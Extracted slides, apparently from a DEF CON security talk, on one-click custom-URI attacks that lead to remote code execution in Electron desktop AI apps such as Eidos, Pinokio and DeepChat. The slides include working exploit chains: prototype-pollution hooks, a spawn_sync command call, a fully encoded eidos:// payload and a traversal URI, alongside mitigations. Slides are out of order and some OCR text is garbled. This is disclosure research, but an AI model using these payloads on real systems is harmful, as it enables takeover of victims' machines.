_// Hook Function.prototype.apply_ ORIG_APPLY = Function.prototype.apply Object.defineProperty(Function.prototype, "apply", { value: function (...args) { const thisArg = args[0]; if (thisArg && thisArg.constructor?.name === "IpcRenderer") { ipcRenderer = thisArg; } return Reflect.apply(ORIG_APPLY, this, args); } });

((require, process, …) => { _// node:electron/js2c/renderer_init_ onMessage(e, t, r, n) { o.ipcRenderer.emit(t, { sender: s, ports: r }, ...n) _// node:events_ EventEmitter.prototype.emit = function emit(type, ...args) { if (typeof handler === 'function') { handler.apply(this, args); } })(require, process, …)

**Website Code (XSS)**

###### **Preload Closure**

74

## Slide 75

#### **Escalating XSS to RCE through Prototype Pollution**

Hook

Function.prototype.apply

#### Invoke

_// Hook Function.prototype.apply_ ORIG_APPLY = Function.prototype.apply Object.defineProperty(Function.prototype, "apply", { value: function (...args) { const thisArg = args[0]; if (thisArg && thisArg.constructor?.name === "IpcRenderer") { ipcRenderer = thisArg; } return Reflect.apply(ORIG_APPLY, this, args); } Leak ipcRenderer }); object

((require, process, …) => { _// node:electron/js2c/renderer_init_ onMessage(e, t, r, n) { o.ipcRenderer.emit(t, { sender: s, ports: r }, ...n) _// node:events_ EventEmitter.prototype.emit = function emit(type, ...args) { if (typeof handler === 'function') { handler.apply(this, args); } })(require, process, …)

**Website Code (XSS)**

**Preload Closure**

75

## Slide 76

#### **Escalating XSS to RCE through Prototype Pollution**

#### Invoke

Hook

Function.prototype.apply EventEmitter.prototype.emit

// Hook EventEmitter.prototype.emit _emitter = ipcRenderer.constructor.prototype.__proto__ _emit = _EMIT.emit Object.defineProperty(_emitter, "emit", { value: function (...args) { const thisArg = args[0]; if (thisArg && thisArg.execve) { process = thisArg; } return Reflect.apply(_emit, this, args); }, });

((require, process, …) => { _// node:events_ function _addListener(target, type, listener, prepend) { m = _getMaxListeners(target); if (m > 0 && existing.length > m && !existing.warned) { const w = genericNodeError(`...`); process.emitWarning(w); } }

// Trigger the gadgets by spam the listener ipcRenderer.setMaxListeners(2); Trigger for (let i = 0; i < 50; i++) { _emitter.addListener.call(ipcRenderer, 'pwn', () => {}); }

Trigger

process.emitWarning = (w) = { process.emit(w) } })(require, process, …)

**Website Code (XSS)**

**Preload Closure**

76

## Slide 77

#### **Escalating XSS to RCE through Prototype Pollution**

Hook

Invoke Function.prototype.apply EventEmitter.prototype.emit

// Hook EventEmitter.prototype.emit _emitter = ipcRenderer.constructor.prototype.__proto__ _emit = _EMIT.emit Object.defineProperty(_emitter, "emit", { value: function (...args) { const thisArg = args[0]; if (thisArg && thisArg.execve) { process = thisArg; } return Reflect.apply(_emit, this, args); }, }); // Trigger the gadgets by spam the listener ipcRenderer.setMaxListeners(2); Trigger for (let i = 0; i < Leak process object 50; i++) { _emitter.addListener.call(ipcRenderer, 'pwn', () => {}); }

((require, process, …) => { _// node:events_ function _addListener(target, type, listener, prepend) { m = _getMaxListeners(target); if (m > 0 && existing.length > m && !existing.warned) { const w = genericNodeError(`...`); process.emitWarning(w); } } process.emitWarning = (w) = { process.emit(w) } })(require, process, …)

**Website Code (XSS)**

**Preload Closure**

77

## Slide 78

#### **Escalating XSS to RCE through Prototype Pollution**

Hook Function.prototype.apply EventEmitter.prototype.emit process.binding('spawn_sync').spawn({ file:'/usr/bin/open', args:['/usr/bin/open', '-a', '/System/Applications/Calculator.app'], stdio:[ {type:'pipe',readable:!0}, {type:'pipe',writable:!0}, {type:'pipe',writable:!0} ] }); RCE! Trigger Leak process object **Website Code (XSS)**

78

## Slide 79

#### **Defense**

**What if** **contextIsolation=1?** Use different V8 contexts! No more prototype pollution :<

**Website Code Preload Scripts** e.g., https://google.com **Electron Renderer Process**

79

## Slide 80

###### **DEMO 4: MAIN** → **RENDERER** → **MAIN** → **DB** → **MAIN**

80

## Slide 81

**§4 · DEMO 4: MAIN → RENDERER → MAIN → DB → MAIN**

## **Eidos — a 5-stage XSS** → **RCE (CVE-2025-54374)**

**string break IPC addExtension re-init Main Renderer Main Database eidos:// URI new Function() executeJS XSS ipcRenderer.invoke SQLite poison UDF spawn_sync**

- **AI workspace  (3.2k** ★ **).**

- nodeIntegration **OFF,** contextIsolation **ON — 'secure by default'.**

**LaunchBreak** ·  DEF CON 34

81

## Slide 82

The story begins…

**1/ String Break to XSS**

82

## Slide 83

#### **String Break to XSS**

// URI example: eidos://block/blockid@databaseName?params

The story begins… **Custom URI parsing code:**

Some transformations

const standaloneBlockUrl = new URL(`${baseUrl}${database}/standalone-blocks/${blockId}`); this.mainWindow.webContents.executeJavaScript(`window.open('${ standaloneBlockUrl. toString()}', '_blank')`);

83

## Slide 84

#### **String Break to XSS**

// URI example: eidos://block/blockid@databaseName?params

The story begins…

**Custom URI parsing code:**

Some transformations

const standaloneBlockUrl = new URL(`${baseUrl}${database}/standalone-blocks/${blockId}`); this.mainWindow.webContents. executeJavaScript( `window.open('${ standaloneBlockUrl. toString()}', '_blank')`);

Possible XSS?

84

## Slide 85

#### **String Break to XSS**

// URI example: eidos://block/blockid@databaseName?params XSS conditions… 1/ The initial URI is valid. const standaloneBlockUrl = new URL( `${baseUrl}${database}/standalone-blocks/${blockId}`); this.mainWindow.webContents. executeJavaScript( `window.open('${ standaloneBlockUrl. toString()}', '_blank')`); standaloneBlockUrl 2/ The Newly built 3/ Escape from the is valid.

3/ Escape from the Single-quote!

85

## Slide 86

#### **String Break to XSS**

**Google’s URL encoding doc:** **<u>https://developers.google.c om/maps/url-encoding?ref= learnhacking.io</u>**

**Most special characters are automatically encoded in the URI. But single quotes (') and commas (,) in the domain or path are not encoded** eidos://a'.com #Valid eidos://a'.,'com, #Valid

**Use fuzzing, we found that the following is valid and escapes single quote:** eidos://block/'+alert(1)-1*'+@hello // Executed Javascript becomes: window.open('http://localhost:13127/hello/standalone-blocks/'+ale rt(1)-1*'+', '_blank')

86

## Slide 87

#### **String Break to XSS**

87

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
String Break to XSS
AMD) venene 3
o Bom Kome @ Orne Ome © ° -@ © priestess. @ HPO @ Stern wan > | Co At pookmas
You've gone Incognito
‘thers who use this device wont see your activity, so you can browse more privately, This
wort change how data colected by websites you Wit and the services they use, incuding
‘Google. Downloads, bookmarks and reading lst ems wil be saved. Learn mate
(chrome wort save: ‘Your setvty might sti be vibe to:
+ Your browsing history + Websites you vist
+ Cookies and site dats + Your employer or school
+ Information entered in forms + Your internet service prover
&& Third-party cookies are blocked
When you're in ncogeto mode, sites cant use third-party cookies. ste that
robes on these cookies isn't working, you canting a lle emeorary acess
to hid-nany cookies.
87
```

## Slide 88

#### The story continues…

**2/ XSS to RCE**

88

## Slide 89

#### **XSS to RCE**

**Eidos has** nodeIntegration **OFF,** contextIsolation **ON**

XSS in renderer does not directly lead to RCE

**However,** ipcRender.invoke **is exposed to the renderer process**

Can we call any privileged APIs through the IPC channel?

89

## Slide 90

#### **XSS to RCE**

#### addExtension

**A method under the DataSpace class that can be called through the 'sqlite-msg' IPC channel.**

// eidos/packages/core/DataSpace.ts // Lines 681 to 683 in 7855b3e public async addExtension(data: IExtension) { await this.script.add(data) }

This lets us add a script row to the database.

90

## Slide 91

#### **XSS to RCE**

#### new Function

###### **When a new DataSpace is created, eidos loads and executes every script in the database.**

// eidos/apps/desktop/electron/data-space.ts // Lines 80 to 86 in 7855b3e

async function initUDF(db: EidosDatabase) {

const scripts = await db.selectObjects(

`SELECT DISTINCT name, code FROM eidos__scripts WHERE type = 'udf' AND enabled = 1` )

for (const script of scripts) { const { code, name } = script const dynamicFunc = new Function("return (" + code + ")")();

Command injection sink!

91

## Slide 92

#### **XSS to RCE**

#### addExtension

+

Inject a script, then execute it!

new Function **However, calling** **addExtension does not automatically triggers new Function. The** **initUDF function only runs when a new DataSpace object is created.** Injection but no executing

eidos.invoke("sqlite-msg", {"data":{ "space":"1", "dbName":"1", "method":"addExtension", "params":[{"type":"udf","enabled":"1","code":"require('fs').writeFileSync('/tmp/pwnd','')","name":"exp"}]}})

92

## Slide 93

#### **XSS to RCE**

#### addExtension

+

Inject a script, then execute it!

new Function **However, calling** **addExtension does not automatically triggers new Function. The** **initUDF function only runs when a new DataSpace object is created.**

**Solution: Inject, switch to another, then switch back!** 1/ Inject 2/ Switch away

eidos.invoke("sqlite-msg", {"data":{ "space":"1", "dbName":"1", "method":"addExtension", "params":[{"type":"udf","enabled":"1","code":"require('fs').writeFileSync('/tmp/pwnd','')","name":"exp"}]}}) eidos.invoke("sqlite-msg", {"data":{ "space":"2", "dbName":"2", "method":"listScripts", "params":["all"]}}) eidos.invoke("sqlite-msg", {"data":{ "space":"1", "dbName":"1", "method":"listScripts", "params":["all"]}})

3/ Switch back

93

## Slide 94

#### Almost there…

**3/ Bypass URL character restrictions**

94

## Slide 95

#### **Bypass URL character restrictions**

#### Workaround No {,}

// {'space':'a/b'} Object.create(null).space = 'a/b'

Workaround No /

// {'space':'a/b'} Object.create(null).space = 'a' + String.fromCharCode(47) + 'b'

95

## Slide 96

#### **Bypass URL character restrictions**

#### Put everything together…

eidos://block/'+eidos.invoke('sqlite-msg',(o=Object.create(null),d=Object.create(null),x=Object.create(null),x.type='udf',x .enabled='1',x.code=String.fromCharCode(40,40,41,61,62,123,118,97,114,32,111,61,79,98,106,101,99,116,46,99,114, 101,97,116,101,40,110,117,108,108,41,44,97,61,39,47,117,115,114,47,98,105,110,47,111,112,101,110,32,47,83,121, 115,116,101,109,47,65,112,112,108,105,99,97,116,105,111,110,115,47,67,97,108,99,117,108,97,116,111,114,46,97, 112,112,39,46,115,112,108,105,116,40,39,32,39,41,59,111,46,102,105,108,101,61,39,47,117,115,114,47,98,105,110, 47,111,112,101,110,39,59,111,46,97,114,103,115,61,97,59,118,97,114,32,115,48,61,79,98,106,101,99,116,46,99,114 ,101,97,116,101,40,110,117,108,108,41,44,115,49,61,79,98,106,101,99,116,46,99,114,101,97,116,101,40,110,117,10 8,108,41,44,115,50,61,79,98,106,101,99,116,46,99,114,101,97,116,101,40,110,117,108,108,41,59,115,48,46,116,121 ,112,101,61,39,112,105,112,101,39,59,115,48,46,114,101,97,100,97,98,108,101,61,33,48,59,115,49,46,116,121,112, 101,61,39,112,105,112,101,39,59,115,49,46,119,114,105,116,97,98,108,101,61,33,48,59,115,50,46,116,121,112,101, 61,39,112,105,112,101,39,59,115,50,46,119,114,105,116,97,98,108,101,61,33,48,59,111,46,115,116,100,105,111,61, 65,114,114,97,121,46,111,102,40,115,48,44,115,49,44,115,50,41,59,112,114,111,99,101,115,115,46,98,105,110,100, 105,110,103,40,39,115,112,97,119,110,95,115,121,110,99,39,41,46,115,112,97,119,110,40,111,41,125,41,40,41),x.n ame='exp',d.params=Array.of(x),d.space='1234',d.dbName='1234',d.method='addExtension',o.data=d,o))+eidos.invoke ('sqlite-msg',(o=Object.create(null),d=Object.create(null),o.data=d,d.space='4',d.dbName='4',d.method='listScripts',d.pa rams='all'.split(String.fromCharCode(32)),o))+eidos.invoke('sqlite-msg',(o=Object.create(null),d=Object.create(null),o.d ata=d,d.space='1234',d.dbName='1234',d.method='listScripts',d.params='all'.split(String.fromCharCode(32)),o))-1*'+@

hello

96

## Slide 97

#### **Bypass URL character restrictions**

#### Put everything together…

eidos://block/'+eidos.invoke('sqlite-msg',(o=Object.create(null),d=Object.create(null),x=Object.create(null),x.type='udf',x .enabled='1',x.code=String.fromCharCode(40,40,41,61,62,123,118,97,114,32,111,61,79,98,106,101,99,116,46,99,114, 101,97,116,101,40,110,117,108,108,41,44,97,61,39,47,117,115,114,47,98,105,110,47,111,112,101,110,32,47,83,121, 115,116,101,109,47,65,112,112,108,105,99,97,116,105,111,110,115,47,67,97,108,99,117,108,97,116,111,114,46,97, 112,112,39,46,115,112,108,105,116,40,39,32,39,41,59,111,46,102,105,108,101,61,39,47,117,115,114,47,98,105,110, 47,111,112,101,110,39,59,111,46,97,114,103,115,61,97,59,118,97,114,32,115,48,61,79,98,106,101,99,116,46,99,114 ,101,97,116,101,40,110,117,108,108,41,44,115,49,61,79,98,106,101,99,116,46,99,114,101,97,116,101,40,110,117,10 8,108,41,44,115,50,61,79,98,106,101,99,116,46,99,114,101,97,116,101,40,110,117,108,108,41,59,115,48,46,116,121 ,112,101,61,39,112,105,112,101,39,59,115,48,46,114,101,97,100,97,98,108,101,61,33,48,59,115,49,46,116,121,112, 101,61,39,112,105,112,101,39,59,115,49,46,119,114,105,116,97,98,108,101,61,33,48,59,115,50,46,116,121,112,101, 61,39,112,105,112,101,39,59,115,50,46,119,114,105,116,97,98,108,101,61,33,48,59,111,46,115,116,100,105,111,61, 65,114,114,97,121,46,111,102,40,115,48,44,115,49,44,115,50,41,59,112,114,111,99,101,115,115,46,98,105,110,100, 105,110,103,40,39,115,112,97,119,110,95,115,121,110,99,39,41,46,115,112,97,119,110,40,111,41,125,41,40,41),x.n ame='exp',d.params=Array.of(x),d.space='1234',d.dbName='1234',d.method='addExtension',o.data=d,o))+eidos.invoke ('sqlite-msg',(o=Object.create(null),d=Object.create(null),o.data=d,d.space='4',d.dbName='4',d.method='listScripts',d.pa rams='all'.split(String.fromCharCode(32)),o))+eidos.invoke('sqlite-msg',(o=Object.create(null),d=Object.create(null),o.d ata=d,d.space='1234',d.dbName='1234',d.method='listScripts',d.params='all'.split(String.fromCharCode(32)),o))-1*'+@

hello

97

## Slide 98

98

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
hello
RARE x +
© € Google HMR, SHAME
BeHATRRY
Trash
CRALEOALARA ACM BACR, AUT RSE IA
CAIN MBRAMARS (BIE Google) MMRBUEHAM. FAA.
REEL. Tt
P Chrome REARF UPSAVES SAA:
| 7 Es) Bit br
ICR . i8) if
© Cookie AM@MRIE
+ imp
@ Settings
=F Cookie
RATES. Cookie HIPAMA7CIAIE
Fi Cookie. S05RR MAM
```

## Slide 99

###### **DEMO 5: MAIN (TOP-LEVEL NAV)** → **LOCAL SERVER**

99

## Slide 100

**§4 · DEMO 5: MAIN (TOP-LEVEL NAV) → LOCAL SERVER**

## **Pinokio — the installer is the exploit (CVE-2025-44109)**

**navigate /_api/ traverse**

**pinokio:// URI**

**Main top-level nav**

**local server redirect + ..%2F**

loader.load(.js) **Node exec**

**using Pinokio as designed // auto-download to ~/Downloads: Content-Disposition: attachment // URI with double-encoded traversal: pinokio://?uri=~/_api/**

**%252E%252E%252F..Downloads/ca lc.js // loads & runs any .js: kernel.loader.load(filepath)**

- **Browser-like app that runs a local server to install AI tools by loading .js**

- **on demand.**

- **Unvalidated redirect + %2E%2E path traversal** → **escape app dir** →

- **load attacker's dropped calc.js.**

▸ **The install mechanism itself is the execution primitive.** ▸ **Scenario: 'faster model installer!' on r/StableDiffusion** → **thousands popped.**

100

**LaunchBreak** ·  DEF CON 34

## Slide 101

#### **1/ internal Routing**

101

## Slide 102

#### **1/ internal Routing**

An internal Routing?

app.on('open-url', (event, url) => { let u = url.replace( /pinokio:[\/]+/, "") loadNewWindow( `${root_url}/pinokio/${u}`, PORT) })

this.app.get("/pinokio", ex((req, res) => { // parse the uri & path let {uri, ...query} = req.query let querystring = new URLSearchParams(query).toString() let webpath = this.kernel.api.webPath (req.query.uri) if (querystring && querystring.length > 0) { webpath = webpath + "?" + querystring } res.redirect(webpath) }))

const loadNewWindow = (url, port) => { ... let win = new BrowserWindow({ ... webPreferences: { webSecurity: false, nativeWindowOpen: true, contextIsolation: false, nodeIntegrationInSubFrames: true, preload: path.join(__dirname, 'preload.js') }, }) ... win.loadURL(url) ... }

**pinokio://?uri=/knock_knock**

Routing to an Code Execution Frame!

102

## Slide 103

**1/ internal Routing** this.app.get("/pinokio", ex((req, res) => { // parse the uri & path let {uri, ...query} = req.query let querystring = new An internal Routing? URLSearchParams(query).toString() let webpath = this.kernel.api.webPath (req.query.uri) app.on('open-url', (event, url) => { if (querystring && querystring.length > 0) { webpath = webpath + "?" + querystring let u = url.replace( /pinokio:[\/]+/, "") } res.redirect(webpath) loadNewWindow( `${root_url}/pinokio/${u}`, PORT) })) }) Can we control  the routed path? const loadNewWindow = (url, port) => { ... let win = new BrowserWindow({ ... webPreferences: { webSecurity: false, nativeWindowOpen: true, contextIsolation: false, nodeIntegrationInSubFrames: true, preload: path.join(__dirname, 'preload.js') }, }) ... win.loadURL(url) ... }

**pinokio://?uri=/knock_knock**

Routing to an Code Execution Frame!

103

## Slide 104

**2/ Path Traversal -> Arbitrary Javascript Load**

104

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2/ Path Traversal ‘A
-> Arbitrary Javascript Load ‘ *
104
```

## Slide 105

#### **2/ Path Traversal -> Arbitrary Javascript Load**

Http routing -> attacker controllable page?

webPath(uri) { let modpath if (uri.startsWith("http")) {

**pinokio://?uri=http://...**

- // git url

- // test to see if any of the gitPaths match partially

modpath = this.resolveWebPath(uri)

- } else if (uri.startsWith("~/")) {

- // absolute path modpath = `/${uri.slice(2)}`

- } else {

throw new Error("uri must be either an http uri or start with ~/") } return modpath }

105

## Slide 106

#### **2/ Path Traversal -> Arbitrary Javascript Load**

#### Http routing -> attacker controllable page?

webPath(uri) { let modpath if (uri.startsWith("http")) {

- // git url

- // test to see if any of the gitPaths match partially modpath = this.resolveWebPath(uri)

- } else if (uri.startsWith("~/")) {

- // absolute path modpath = `/${uri.slice(2)}`

- } else {

throw new Error("uri must be either an http uri or start with ~/") } return modpath }

resolveWebPath(uri) {

- let repos = Object.keys(this.gitPath) let matched_repo = repos.filter((repo) => { return uri.includes(repo)

- }) if (matched_repo.length > 0) { let repo_uri = matched_repo[0]

let relative_path = uri .replace(repo_uri, "")    // remove the git repo uri

- .slice(1)                 // remove the leading '/' for relative path

let repopath = this.gitPath[repo_uri] let reponame = path.basename(repopath)

return `/api/${reponame}/${relative_path}` } else { return null } } Match In-Repo File

106

## Slide 107

#### **2/ Path Traversal -> JS Load**

###### **pinokio://?uri=~/...**

webPath(uri) { let modpath if (uri.startsWith("http")) {

###### **pinokio://?uri=~/_api/**

this.app.get("/_api/*", ex(async (req, res) => { let pathComponents = req.params[0].split("/") req.query.mode = "source" try {

await this.render(req, res, pathComponents) } catch (e) { res.status(404).send(e.message) }

}))

- // git url

- // test to see if any of the gitPaths match partially modpath = this.resolveWebPath(uri)

- } else if (uri.startsWith("~/")) { // absolute path modpath = `/${uri.slice(2)}`

- } else {

throw new Error("uri must be either an http uri or start with ~/") } return modpath }

// class Kernel path(...args) { return path.resolve(this.homedir, ...args) } Path Traversal !

async render(req, res, pathComponents, meta) { let full_filepath = this.kernel.path("api", ...pathComponents)

... if (filepath.endsWith(".js")) { try { js = (await this.kernel.loader.load(filepath)).resolved mod = true } catch (e) { console.log("######### load error", filepath, e) } } class Loader { async load(_path) { ... if (/\.js$/i.test(_path)) { resolved = await this.requireJS(_path) ... } } JS load! async requireJS(filepath) {

... try { config = require(filepath) } catch (e) { ... }

107

## Slide 108

**§4 · RECAP**

## **One trigger, many chains**

▸ **Every demo started the same way: a single browser click on a custom URI.**

- **Every demo ended the same way: OS command injection on the victim's machine.**

▸ **Everything in between was different — IPC relays, navigation, webviews, databases, local servers, prototype pollution.**

▸ **That diversity is exactly why manual review and single-strategy tools miss it, and why segmented fuzzing generalizes.**

108

**LaunchBreak** ·  DEF CON 34

## Slide 109

**Mitigations & Takeaways 0x05 Your click, your choice**

109

## Slide 110

###### **§5 · MITIGATIONS**

## **For developers**

- **Treat custom URI handlers as an UNTRUSTED external boundary — the danger comes from**

- **outside the app.**

- **Sanitize & validate every field before it flows into privileged logic.**

- **Reduce privileged URI-triggered flows — least privilege at the handler.**

- **Validate domains with real URL parsing + allowlists, not string matching.**

- **Lock down webContents:** nodeIntegration **off,** contextIsolation **on,** sandbox **on.**

- **Isolate untrusted content in webviews; never serve the app from file://.**

- **Prompt for approval before acting on external URIs.**

110

**LaunchBreak** ·  DEF CON 34

## Slide 111

###### **§5 · MITIGATIONS**

## **For platforms & users**

**Platforms & browsers**

- **Show the FULL URI contents in the launch**

- **prompt.**

- **Reduce opaque payload delivery to**

- **desktop apps.**

- **Make browser-to-app handoff auditable**

- **and informed.**

**You (users)**

- **Treat custom URI links like any untrusted**

- **link.**

- **Never check “Always allow” — that**

**removes the last human barrier.**

- **Your click, your choice. Agency at the**

- **doorway.**

111

**LaunchBreak** ·  DEF CON 34

## Slide 112

###### **§5 · TAKEAWAYS**

## **Three things to walk out with**

**Developers The danger comes from outside (the desktop app).**

**Users**

**Never “Always allow.”**

**Researchers**

**Segment to conquer.**

**When state space explodes, segment the chain into independent, composable pieces.**

112

**LaunchBreak** ·  DEF CON 34

## Slide 113

**LaunchBreak A sip of tea, a click and your desktop was never yours alone.**

**18 zero-days  ·  17 RCE  ·  11 CVEs**

- **Thank you — questions?**

▸ **Jianjia Yu · Zhengyu Liu · Jiacheng Zhong  —  Johns Hopkins University, UC Santa Barbara**

**Contributors: Ziyang Li · Yu Sun · Yinzhi Cao**

**Proton Zero-days**

**Proton tool**

**Proton paper on arxiv**

113

**LaunchBreak** ·  DEF CON 34

## Slide 114

**§5 · RELEASE**

## **We're releasing everything**

- **Proton — the agent-guided segmented fuzzer that**

- **found 18 zero-day vulnerabilities.**

- **Built on jazzer.js + libfuzzer, with Claude driving Phase-I**

- **analysis.**

- **PoCs for every vulnerability we disclosed.**

114

**LaunchBreak** ·  DEF CON 34

**39**

## Slide 115

**DEF CON 34  ·  MAIN STAGE  ·  APPLICATION SECURITY**

**LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover**

**Jianjia Yu** · **Zhengyu Liu** · **Jiacheng Zhong**

Johns Hopkins University  &  independent research

**18 zero-days  ·  17 RCE  ·  a browser click to your shell**

Contributors: Ziyang Li · Yu Sun · Yinzhi Cao      cs.jhu.edu/~susuyu

115

## Slide 116

###### **THE WHOLE TALK IN ONE MOMENT**

**One sip of tea. One click in a browser. Full remote code execution.**

- No XSS. No existing foothold. No second click.

- The victim is just... reading a webpage.

- This really happens — in apps you have installed right now.

**STILL FRAME — replace with live video (5ire one-click RCE)**

**LaunchBreak** ·  DEF CON 34

116

**02**

## Slide 117

**§1 · INTRO**

###### **Chrome**

https://deepchat/mcp-install

## **The AI desktop-app gold rush**

**Features:**

   - Please click on this <u>link</u>

- The AI boom pushes hundreds of Electron

- apps to ship with custom URI:

- click a link in your browser → the app launches

- with agent onboarding flows: MCP install / plugin install / even prompt-driven actions

▸ One click, zero friction.

▸ Also: one click, full remote code execution.

Examples: Cherry Studio, Hyper, AFFiNE, DeepChat, Dive, Pinokio, …

**LaunchBreak** ·  DEF CON 34

117 **05**

## Slide 118

###### **§1 · INTRO**

## **Custom URI 101**

- Apps register an OS-level custom scheme:  myapp://

- The browser just asks 'Open myapp?'

- Modern onboarding rides on it:

   - MCP server install

   - plugin / extension install

   - workspace / config import

   - prompt-driven 'do this for me' actions

- The URI isn't just a doorbell — its contents flow into

- privileged logic.

- <!-- attacker's webpage -->

- <a href="cherrystudio://mcp/install

?url=evil.com/x"> Install this cool MCP server!

</a>

- // browser: "Open Cherry Studio?" //   [ Cancel ]     [ Open ]

// one click → app parses the URI //   → and trusts it.

**LaunchBreak** ·  DEF CON 34

118

**06**

## Slide 119

**§4 · DEMO 4: MAIN → RENDERER → MAIN → DB → MAIN**

## **Eidos — a 5-stage XSS** → **RCE (CVE-2025-54374)**

**string break Renderer eidos:// URI executeJS XSS**

**IPC addExtension re-init Main Main Database new Function() ipcRenderer.invoke SQLite poison UDF spawn_sync**

**secure-by-default renderer // 1. break out of window.open string eidos://block/'+alert(1)-1*'+@x // 2. invoke privileged IPC eidos.invoke('sqlite-msg',{addExtension}) // 3. switch space** → **initUDF() new Function('return('+code+')')() // 4. require-less RCE: process.binding('spawn_sync').spawn(..)**

- **Local-first AI workspace; nodeIntegration OFF,**

- **contextIsolation ON — 'secure by default'.** ▸ **Single quotes & commas aren't URL-encoded** → **JS string break-out.**

▸ **No require()? Use process.binding('spawn_sync').** ▸ **1000+ char URL-safe payload: Object.create(null), Array.of(), fromCharCode().**

**LaunchBreak** ·  DEF CON 34

119 **31**

## Slide 120

**§1 · INTRO**

## **Custom URI 101**

- Apps register an OS-level custom scheme:  myapp://

**macOS** LaunchServices

- Different OS has its own registration + launch path:

   - macOS — CFBundleURLTypes / LaunchServices

   - Windows — HKCR registry scheme + shell open command

   - Linux — .desktop MimeType handlers

Windows HKCR + shell open

**Linux** .desktop handler

▸ A single attacker-controlled URI → privileged app logic → RCE.

**same tainted source →  RCE**

**LaunchBreak** ·  DEF CON 34

**07**

120

## Slide 121

###### **§2 · BACKGROUND**

## **Electron in one slide**

###### **Main process**

###### **Renderer process**

###### **Preload**

Node.js · full native API app lifecycle · window mgmt spawn / exec / fs

Chromium page · DOM web content + JS (where XSS lives)

bridge · exposes selected privileged APIs to renderer

###### **Utility process**

###### **IPC channels**

spawned by main Node.js access background tasks

ipcMain/ipcRenderer MessagePort the glue = the risk

- Privilege gradient: main/utility = full Node.js ·  renderer = sandboxed web content ·  preload = the guarded bridge

- between them.

▸ LaunchBreak abuses the app's OWN IPC channels to carry taint across that gradient — from a webpage all the way to spawn().

**LaunchBreak** ·  DEF CON 34

121 **12**

## Slide 122

###### **§1 · INTRO**

## **The URI enters the victim app and lead to further consequences..**

**opens**

**taint**

**propagate**

**reach**

**Browser link** attacker-controlled

**URI handler** main process

**Parse + dispatch** app logic

**Cross-process** IPC / fetch

**Privileged sink** exec / eval

▸ The URI string is attacker input that gets parsed, split, decoded, and routed by the app's own privileged code.

▸ It can hop across process boundaries — main → utility → renderer — before it ever reaches a dangerous API.

▸ So this is not 'URI parsing bug 101'. It's a multi-stage, cross-process taint problem that starts outside the app.

**LaunchBreak** ·  DEF CON 34

122

**08**

## Slide 123

▸ **Crafted URI** → **fetch attacker content (CSRF)** → **renderer v-html (DOM-XSS)** → **OS command injection.**

###### **§1 · MOTIVATING DEMO**

## **Demo 0 — Paperlib: one-click RCE**

▸ **Paperlib open-source reference manager (2.2k ).**

- **Two payload sources, three**

- **processes, one click.**

**LaunchBreak** ·  DEF CON 34

**09**

123

## Slide 124

**§3 · DESIGN**

## **The three moving parts**

**Harness synthesis**

LLM writes a small patch that registers a per-segment entry point (global.__proton__.harness) so the fuzzer can drive that segment directly — no need to replay earlier processes.

###### **Runtime canaries**

Hooks on dangerous APIs (spawn, executeJavaScript, innerHTML…) fire when an attacker-controlled marker reaches them — a precise, low-false-positive oracle.

**Invertible reconstruction**

For parse-heavy segments, Proton inverts JSON.parse / new URL to synthesize a valid input for a desired parsed value — skipping the sparsity problem entirely.

**LaunchBreak** ·  DEF CON 34

124

**24**

## Slide 125

**§4 · DEMO 6: MULTI-SOURCE · MINIFIED**

## **DeepChat — two sources, obfuscated IPC (CVE-2025-55733)**

**Source I**

**+ drop route**

**deepchat://**

**downloaded file Source II**

**Main minified IPC 'a342'**

**handler** command inj

- **Two things fire at once: a deepchat:// link AND a**

- **forced-download JS file.**

- **Browser auto-drops the file to ~/Downloads; the URI makes**

- **the app load it.**

- **Payload traverses minified IPC channels (names like 'a342')**

- **to a privileged handler** → **command injection.**

- **Proton's LLM agent de-obfuscated the channel names from**

- **data flow — obfuscation ≠ safety.**

**DeepChat CVE-2025-55733**

**LaunchBreak** ·  DEF CON 34

125

**33**

## Slide 126

**§3 · THE IDEA**

## **Why end-to-end fuzzing explodes**

- Model a fuzzing campaign's cost by its program state

- space:

   - |I| = instructions on the path,  N = input space

- One monolithic campaign to validate a path:

**single-path cost**

O( N · |I| )

###### **The intuition**

- Every extra process multiplies the search.

- A payload that fails to cross boundary #1 wastes

- all the budget you'd spend past it.

- Deep, cross-process bugs become practically

unreachable.

- So: don't fuzz the whole chain at once.

two segments, end-to-end:

- O( (Na + Nb) · |Ia| · |Ib| )   ← multiplicative

**LaunchBreak** ·  DEF CON 34

**21**

126
